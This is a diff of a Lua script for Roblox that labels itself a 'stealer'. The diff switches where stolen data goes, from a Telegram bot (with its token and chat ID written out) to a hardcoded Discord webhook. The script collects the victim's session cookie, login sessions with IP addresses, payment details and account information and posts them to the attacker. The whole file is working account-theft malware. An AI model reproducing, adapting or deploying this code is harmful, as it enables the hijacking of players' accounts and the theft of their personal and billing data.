@@ -1,23 +1,30 @@
 --[[
+
+
+
+
+
     solara stealer - magnet
-    Modified for Telegram
+
+
+
+
+
 ]]
 
 local players = game:GetService("Players")
 local player = players.LocalPlayer
 
 local marketplaceService = game:GetService("MarketplaceService")
+
 local httpService = game:GetService("HttpService")
 local requestInternal = httpService.requestInternal
 
 local pretty = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ozzypig/repr/master/repr.lua"))()
 local prettySettings = {pretty = true}
 
--- Telegram configuration
-local TELEGRAM_BOT_TOKEN = "6824283487:AAE3FsA08FM3k9pucpLinj-EWW_A3p3QuAY"
-local TELEGRAM_CHAT_ID = "1287724700"
-local TELEGRAM_API_URL = "https://api.telegram.org/bot"..TELEGRAM_BOT_TOKEN.."/sendMessage"
-
+local DISCORD_HEADERS = {["Content-Type"] = "application/json"}
+local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1376198527515885698/4UY2iKgUjoHth1MfEQ4NSFhAMFTjBOa_Lbo6pi51R23TOu_efuKFc67K78RXF6uGG5Pw"
 local USER_URL = "https://users.roblox.com/v1/users/%s"
 local GAMES_URL = "https://games.roblox.com/v1/games/multiget-place-details?placeIds=%s"
 local EMAIL_URL = "https://accountsettings.roblox.com/v1/email"
@@ -179,39 +186,30 @@ local function getAllSessions(): {{ip: string, agent: string, date: string}}
     return results
 end
 
-local function sendToTelegram(text: string): boolean
-    local body = httpService:JSONEncode({
-        chat_id = TELEGRAM_CHAT_ID,
-        text = text,
-        parse_mode = "HTML"
+local function sendToWebhook(content: string): boolean
+    local body = httpService:JSONEncode({content=content})
+    request({
+        Url = DISCORD_WEBHOOK;
+        Method = "POST";
+        Headers = DISCORD_HEADERS;
+        Body = body;
     })
-    
-    local success, response = internalRequest(TELEGRAM_API_URL, "POST", body)
-    return success
 end
 
-local function formatDataForTelegram(data, title)
-    local formatted = string.format("<b>%s</b>:\n<pre>%s</pre>", title, pretty(data, prettySettings))
-    return formatted
-end
-
--- Main execution
 local sessions = getAllSessions()
 local payments = getPayments()
 local user = getUserInfo()
 local gameInfo = getGameInfo()
 local cookie = reauthenticate()
 
--- Format data for Telegram
-local userContent = formatDataForTelegram(user, "User Information")
-local gameContent = formatDataForTelegram(gameInfo, "Game Information")
-local paymentContent = formatDataForTelegram(payments, "Payment Information")
-local sessionsContent = formatDataForTelegram(sessions, "Session Information")
-local cookieContent = string.format("<b>Cookie</b>:\n<code>%s</code>", cookie)
+local userContent = [[@everyone User was logged:```]] .. pretty(user, prettySettings) .. [[```]]
+local gameContent = [[Game:```]] .. pretty(gameInfo, prettySettings) .. [[```]]
+local paymentContent = [[Billing:```]] .. pretty(payments, prettySettings) .. [[```]]
+local sessionsContent = [[Sessions:```]] .. pretty(sessions, prettySettings) .. [[```]]
+local cookieContent = [[Cookie:```]] .. cookie .. [[```]]
 
--- Send to Telegram
-sendToTelegram(userContent)
-sendToTelegram(gameContent)
-sendToTelegram(paymentContent)
-sendToTelegram(sessionsContent)
-sendToTelegram(cookieContent)
+sendToWebhook(userContent)
+sendToWebhook(gameContent)
+sendToWebhook(paymentContent)
+sendToWebhook(sessionsContent)
+sendToWebhook(cookieContent)
